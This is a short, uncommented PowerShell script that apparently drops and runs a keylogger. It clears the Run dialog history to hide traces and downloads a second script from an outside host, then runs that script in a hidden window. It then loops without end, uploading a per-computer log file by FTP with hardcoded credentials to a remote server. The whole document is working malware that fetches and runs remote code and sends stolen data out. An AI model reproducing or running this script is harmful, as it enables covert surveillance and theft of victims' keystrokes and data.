reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f;
cd c:\users\public\
(New-object System.Net.WebClient).DownloadFile('http://fq.wc.lt/up/1463304777.ps1','c:\users\public\log.ps1');
start-process -FilePath powershell "-w hidden ./log.ps1"
$log=$env:COMPUTERNAME
while($z=1){
Start-Sleep -Seconds 5
Copy-Item ./log.txt ./GetLog-$log.txt
$fileinf=New-Object System.Io.FileInfo("c:\users\public\GetLog-$log.txt");
$ftp = [System.Net.FtpWebRequest] [System.Net.FtpWebRequest]::Create("ftp://006.3vftp.com/"+$fileinf.name)
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = new-object System.Net.NetworkCredential("badtest88","admin88")
$ftp.UseBinary = $true
$ftp.UsePassive = $true
$content = [System.IO.File]::ReadAllBytes($fileInf.fullname)
$ftp.ContentLength = $content.Length
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
$rs.Close()
$rs.Dispose()
}